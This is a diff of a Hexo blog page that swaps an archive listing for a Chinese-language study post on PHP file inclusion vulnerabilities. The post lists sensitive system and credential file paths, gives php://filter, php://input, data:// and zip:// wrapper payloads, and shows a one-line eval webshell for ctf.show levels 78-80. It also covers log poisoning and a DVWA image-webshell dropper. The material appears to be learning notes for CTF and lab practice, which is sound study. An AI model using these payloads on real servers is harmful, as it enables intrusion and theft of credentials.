@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.8.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/2025/01/"/>
+  
+  <link rel="canonical" href="http://example.com/2025/02/04/文件包含漏洞/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,15 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive: 2025/1 - Hexo</title>
+  <title>文件包含漏洞 - Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2025/01/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="http://example.com/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件包含漏洞笔记前言又到了前言，文件上传漏洞感觉差不多了，于是开始文件包含漏洞，只要是因为感觉和文件上传类似 什么是文件包含漏洞 和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。 什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。 有">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-02-04T09:25:56.000Z">
+<meta property="article:modified_time" content="2025-02-05T03:52:35.169Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2168,7 +2172,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin end-->
     <!-- front-matter body_begin begin -->
     <!-- front-matter body_begin end -->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2437,7 +2441,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  dock' style="display: ;">
+      <div id="none" class='cover-wrapper post dock' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
 
@@ -2512,32 +2516,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/21/留言板/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/04/文件包含漏洞/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2546,337 +2526,366 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/"  itemprop="url">
-        留言板
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
+    
+    
+      <h1 class="title" itemprop="name headline">
+        文件包含漏洞
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-02-04T17:25:56+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Feb 4, 2025</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="文件包含漏洞笔记"><a href="#文件包含漏洞笔记" class="headerlink" title="文件包含漏洞笔记"></a>文件包含漏洞笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又到了前言，文件上传漏洞感觉差不多了，于是开始文件包含漏洞，只要是因为感觉和文件上传类似</p>
+<p><strong>什么是文件包含漏洞</strong></p>
+<p>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p>
+<p>区别如下:</p>
+<ul>
+<li><p>require():找不到被包含的文件会产生致命错误，并停止脚本运行</p>
+</li>
+<li><p>include():找不到被包含的文件只会产生警告，脚本继续执行</p>
+</li>
+<li><p>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
+</li>
+<li><p>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
+</li>
+</ul>
+<p><strong>漏洞成因</strong></p>
+<p>我们先直接来看一个简单的例子，网页代码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再创建一个phpinfo.php页面，代码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用文件包含，我们通过include函数来执行phpinfo.php页面，成功解析</p>
+<img src="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/89e6cfe24d494cec8c22d5caeb9a58b6.png" class="lazyload" data-srcset="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/89e6cfe24d494cec8c22d5caeb9a58b6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="在这里插入图片描述">
+
+<p>将phpinfo.php文件后缀改为txt后进行访问，依然可以解析:</p>
+<p>可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。</p>
+<p>在上一期的文件上传漏洞的总结中，我们上传了一个jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用</p>
+<h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>测试网页包含如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用该代码，我们可以读取一些系统本地的敏感信息。<br>例如:<code>C:\Windows\system.ini</code>文件。</p>
+<p><strong>使用绝对路径</strong></p>
+<p>使用绝对路径直接读取:如日志文件(&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log)</p>
+<p><strong>使用相对路径</strong></p>
+<p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。</p>
+<p>一些常见的敏感目录信息路径:<br>Windows系统:</p>
+<ul>
+<li><p>C:\boot.ini &#x2F;&#x2F;查看系统版本</p>
+</li>
+<li><p>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件</p>
+</li>
+<li><p>C:\windows\repair\sam &#x2F;&#x2F;存储Windows系统初次安装的密码</p>
+</li>
+<li><p>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysql配置</p>
+</li>
+<li><p>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL root密码</p>
+</li>
+<li><p>C:\windows\php.ini &#x2F;&#x2F;php配置信息</p>
+</li>
+</ul>
+<p>Linux&#x2F;Unix系统:</p>
+<ul>
+<li><p>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息</p>
+</li>
+<li><p>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息</p>
+</li>
+<li><p>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件</p>
+</li>
+<li><p>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置</p>
+</li>
+<li><p>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置</p>
+</li>
+<li><p>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件</p>
+</li>
+<li><p>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件</p>
+</li>
+</ul>
+<h2 id="2-php伪协议"><a href="#2-php伪协议" class="headerlink" title="2.php伪协议"></a>2.php伪协议</h2><p>为什么从伪协议开始，主要是因为其他看不懂，只有php好看一点</p>
+<h3 id="1-file-协议"><a href="#1-file-协议" class="headerlink" title="1.file:&#x2F;&#x2F;协议"></a>1.file:&#x2F;&#x2F;协议</h3><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
+<p>语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// [文件的绝对路径和文件名]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-php-协议"><a href="#2-php-协议" class="headerlink" title="2.php:&#x2F;&#x2F;协议"></a>2.php:&#x2F;&#x2F;协议</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<strong>php:&#x2F;&#x2F;filter</strong>和<strong>php:&#x2F;&#x2F;input</strong><br><strong>php:&#x2F;&#x2F;filter用于读取源码</strong>。<br><strong>php:&#x2F;&#x2F;input用于执行php代码</strong>。</p>
+<h4 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php:&#x2F;&#x2F;filter"></a>1.php:&#x2F;&#x2F;filter</h4><p><strong>php:&#x2F;&#x2F;filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
+<p>语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=文件路径</span></span><br></pre></td></tr></table></figure>
+
+<p>我们来看下ctf show 78关</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>include函数会访问传入的文件，并以php执行，如果执行不成功则返回文件源码。</p>
+<p>我们传入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP伪协议把flag.php进行base64编码，导致无法执行返回源码，我们是拿着源码去解码就可以看到文件内容了</p>
+<p>至于我们为什么知道flag.php的位置，现在我只有一种方法，就是使用system()函数去找(话说，能用system()了，找到直接访问不就行了^_^)</p>
+<h4 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php:&#x2F;&#x2F;input"></a>2.php:&#x2F;&#x2F;input</h4><p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
+<p>也就是说，我们只要让include()执行php:&#x2F;&#x2F;input，就可以让post请求中的内容以php执行</p>
+<p><strong>利用条件:</strong></p>
+<ul>
+<li>allow_url_fopen ：off&#x2F;on</li>
+<li>allow_url_include：on</li>
+</ul>
+<p>利用该方法，我们可以直接写入php文件，输入<code>file=php://input</code>，然后使用burp抓包，写入php代码：<img src="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/77e3a356bb8653fe01cb7f79f577c36a.png" class="lazyload" data-srcset="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/77e3a356bb8653fe01cb7f79f577c36a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="在这里插入图片描述"></p>
+<h3 id="2-data-协议"><a href="#2-data-协议" class="headerlink" title="2.data:&#x2F;&#x2F;协议"></a>2.data:&#x2F;&#x2F;协议</h3><p><strong>data:&#x2F;&#x2F;</strong> 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<br><strong>利用条件:</strong></p>
+<ul>
+<li>allow_url_fopen ：on</li>
+<li>allow_url_include：on</li>
+</ul>
+<p>语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="comment">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure>
+
+<p>ctf show 79关</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤掉了php,我们有如下输入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:<span class="comment">//text/plain,&lt;?=@eval($_POST[&#x27;pass&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>完美避免了php的出现，直接蚁剑连接</p>
+<h3 id="3-zip-协议"><a href="#3-zip-协议" class="headerlink" title="3.zip:&#x2F;&#x2F;协议"></a>3.zip:&#x2F;&#x2F;协议</h3><p><strong>zip:&#x2F;&#x2F;</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
+<ul>
+<li>zip:&#x2F;&#x2F;中只能传入绝对路径。</li>
+<li>要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）</li>
+<li>只需要是zip的压缩包即可，后缀名可以任意更改。</li>
+<li>相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;</li>
+</ul>
+<p><strong>利用条件:</strong></p>
+<ul>
+<li>allow_url_fopen ：off&#x2F;on</li>
+<li>allow_url_include：off&#x2F;on</li>
+</ul>
+<p>语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">//[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\1.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><img src="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cdf1dfdb5bf058cc3c07823f2c9a0cc8.png" class="lazyload" data-srcset="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cdf1dfdb5bf058cc3c07823f2c9a0cc8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="在这里插入图片描述">
+
+<h2 id="3-Apache日志文件"><a href="#3-Apache日志文件" class="headerlink" title="3.Apache日志文件"></a>3.Apache日志文件</h2><p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
+<p>利用条件</p>
+<ul>
+<li>对日志文件可读</li>
+<li>知道日志文件时储存目录</li>
+<li>一般情况下日志储存目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf …)或者根据phpinfo()中信息得知</li>
+<li>日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式</li>
+</ul>
+<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log</p>
+<p>默认路径：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>如果我们访问一个不存在的资源，也一样会进行记录</p>
+<p>ctf show 80</p>
+<p>我们首先通过user-agent 向日志文件中写入一句话后门</p>
+<img src="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20250204202118457.png" class="lazyload" data-srcset="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20250204202118457.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250204202118457">
+
+<p>php代码消失，即被解析掉了</p>
+<img src="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20250204202228791.png" class="lazyload" data-srcset="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20250204202228791.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250204202228791">
+
+<p>我们用蚁剑连接即可</p>
+<h2 id="4-配合文件上传使用"><a href="#4-配合文件上传使用" class="headerlink" title="4.配合文件上传使用"></a>4.配合文件上传使用</h2><p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
+<p>以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),&lt;?php <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);<span class="meta">?&gt;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//只要执行此文件就会自动生成shell.php文件内容为一句话木马</span></span><br></pre></td></tr></table></figure>
+
+<p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接</p>
+
+  </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-01-21T17:17:52+08:00">2025-01-21</time>
-        
-      </div>
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-02-05T11:52:35+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 5, 2025</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/16/sqlab/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Hexo">
-    <meta itemprop="description" content="">
-  </span>
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=文件包含漏洞 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=文件包含漏洞 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=文件包含漏洞 - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
   
+
   
+    <div class="prev-next">
+      
+        <a class='prev' href='/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>php命令执行</p>
+          <p class='content'>命令执行漏洞笔记前言文件包含漏洞条件有点苛刻，在学不下的感觉，正好看了下linux命令，来看下命令执行漏洞
+1.什么是命令执行漏洞命令执行漏洞是一种网络安全漏洞，它允许攻击者在受影响的系统上执行...</p>
+        </a>
+      
+      
+        <a class='next' href='/2025/02/01/linux%E5%91%BD%E4%BB%A4/'>
+          <p class='title'>linux命令<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>linux命令笔记前言目前对linux命令感到抽象，因为我是windows系统，而且我没装虚拟机，感觉好难装，但是没装不影响学，可以使用在线命令
+1.linux系统目录结构1.Linux一切皆文...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/01/16/sqlab/"  itemprop="url">
-        sqlab
